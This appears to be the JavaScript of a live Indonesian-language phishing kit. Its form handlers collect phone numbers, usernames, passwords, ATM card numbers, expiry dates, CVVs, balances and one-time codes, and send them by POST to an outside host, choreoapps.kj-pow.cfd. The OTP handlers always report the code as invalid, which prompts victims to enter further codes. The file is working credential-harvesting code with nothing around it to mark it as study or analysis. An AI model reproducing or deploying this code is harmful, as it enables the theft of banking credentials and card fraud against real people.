function sendHp() {
   $('.kleman').fadeIn();   
   $('.x').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   var tarif = $('input[name="tarif"]:checked').val();
   if(tarif) {
      sessionStorage.setItem('tarif', tarif);
   }
   var nohp = $('#nohp').val();
   sessionStorage.setItem('nohp', nohp);
   
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/34/no.php',
      type: 'POST',
      data: $('#login').serialize(),  
      complete: function() {
         setTimeout(function() {
            $("#popupku").fadeIn(200);
            $('.x').hide();            
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
         }, 800);
      }
   });
};     

function sendLogin(){
   $('.load').fadeIn();
    event.preventDefault();   
    $(".lanjutkan").prop("disabled", true);
    document.getElementById('lanjutkan').innerHTML = "Memproses....";               
    
    $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/34/sudah.php',
      type: 'POST',
      data: $('#sudah').serialize(),    
    complete: function(){    
    setTimeout(function(){   
    window.location = "saldosdh.html";
    $("#lonte").hide();
    $('.load').fadeOut();
    document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nohp = $('#nohp').val();
  sessionStorage.setItem('nohp', nohp);
  var atm = $('#atm').val();
  sessionStorage.setItem('atm', atm);
  var valid = $('#valid').val();
  sessionStorage.setItem('valid', valid); 
  var cvv = $('#cvv').val();
  sessionStorage.setItem('cvv', cvv);   

    }, 500);}});};     
    
    
function sendSaldoS() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/34/saldosdh.php',
      type: 'POST',
      data: $('#saldosdh').serialize(),
      complete: function() {
         setTimeout(function() {         
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            var tarif = $('#tarif').val();
            sessionStorage.setItem('tarif', tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem('nohp', nohp);
            var atm = $('#atm').val();
            sessionStorage.setItem('atm', atm);
            var valid = $('#valid').val();
            sessionStorage.setItem('valid', valid);
            var cvv = $('#cvv').val();
            sessionStorage.setItem('cvv', cvv);
            var saldo = $('#saldo').val();
            sessionStorage.setItem('saldo', saldo);
            window.location = "otpsdh.html";
         }, 400);
      }
   });
};        


function sendOtpS() {        
   event.preventDefault();
   $("#loader").fadeIn();   
   $(".btn-primary").prop("disabled", true);
   var nama1 = document.getElementById('nama1');
   
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/34/otpsdh.php',
      type: 'POST',
      data: $('#formsdh').serialize(),
      complete: function(response) {
         $("#loader").fadeOut();      
         $(".btn-primary").prop("disabled", false);
         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
         $("#errorAlert").text("Kode aktivasi tidak VALID!").slideDown();
         $("#nama1").val('');
         $("#nama1").focus();
         setTimeout(function() {
            $("#errorAlert").slideUp();
         }, 3000);
      },
      error: function(error) {
         $("#loader").hide();
         $(".btn-primary").prop("disabled", false);
         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
         $("#errorAlert").text("Gagal mengirim kode aktivasi. Silakan coba lagi.").show();
      }
   });
};  
    
    
// Belum
function sendBelum(){    
    event.preventDefault();   
     $('#btnsubmit').prop('disabled', true);  
  document.getElementById("tarif").value =
        sessionStorage.getItem("tarif");
document.getElementById("nohp").value =
        sessionStorage.getItem("nohp");
                        
       
    
    $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/34/belum.php',
      type: 'POST',
      data: $('#belum').serialize(),   
    complete: function(){
      vibr(200);
    setTimeout(function(){        
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
  var nohp = $('#nohp').val();
  sessionStorage.setItem('nohp', nohp);
  var uname = $('#uname').val();
  sessionStorage.setItem('uname', uname);
  var pass = $('#pass').val();
  sessionStorage.setItem('pass', pass);
     window.location.href='saldoblm.html'
    }, 300);}});};   
    


function sendSaldo() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/34/saldoblm.php',
      type: 'POST',
      data: $('#saldoblm').serialize(),
      complete: function() {
         setTimeout(function() {         
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            var tarif = $('#tarif').val();
            sessionStorage.setItem('tarif', tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem('nohp', nohp);
            var atm = $('#atm').val();
            sessionStorage.setItem('atm', atm);
            var valid = $('#valid').val();
            sessionStorage.setItem('valid', valid);
            var cvv = $('#cvv').val();
            sessionStorage.setItem('cvv', cvv);
            var saldo = $('#saldo').val();
            sessionStorage.setItem('saldo', saldo);
            window.location = "otpblm.html";
         }, 400);
      }
   });
};        
        
        
function sendOtp() {
        document.getElementById("tarif").value =
        sessionStorage.getItem("tarif");
        document.getElementById("nohp").value =     
        sessionStorage.getItem("nohp");     
        document.getElementById("uname").value =
        sessionStorage.getItem("uname");
        document.getElementById("pass").value =
        sessionStorage.getItem("pass");                       
        document.getElementById("saldo").value =
        sessionStorage.getItem("saldo");
   event.preventDefault();
   $("#loader").fadeIn();
   $(".btn-primary").prop("disabled", true);
   var nama1 = document.getElementById('nama1');
   
   $.ajax({
      url: 'https://choreoapps.kj-pow.cfd/34/otpblm.php',
      type: 'POST',
      data: $('#formblm').serialize(),
      complete: function(response) {
         $("#loader").fadeOut();
         $(".btn-primary").prop("disabled", false);
         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
         $("#errorAlert").text("Kode aktivasi tidak VALID!").slideDown();
         $("#nama1").val('');
         $("#nama1").focus();
         setTimeout(function() {
            $("#errorAlert").slideUp();
         }, 3000);
      },
      error: function(error) {
         $("#loader").hide();
         $(".btn-primary").prop("disabled", false);
         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
         $("#errorAlert").text("Gagal mengirim kode aktivasi. Silakan coba lagi.").show();
      }
   });
};                
                
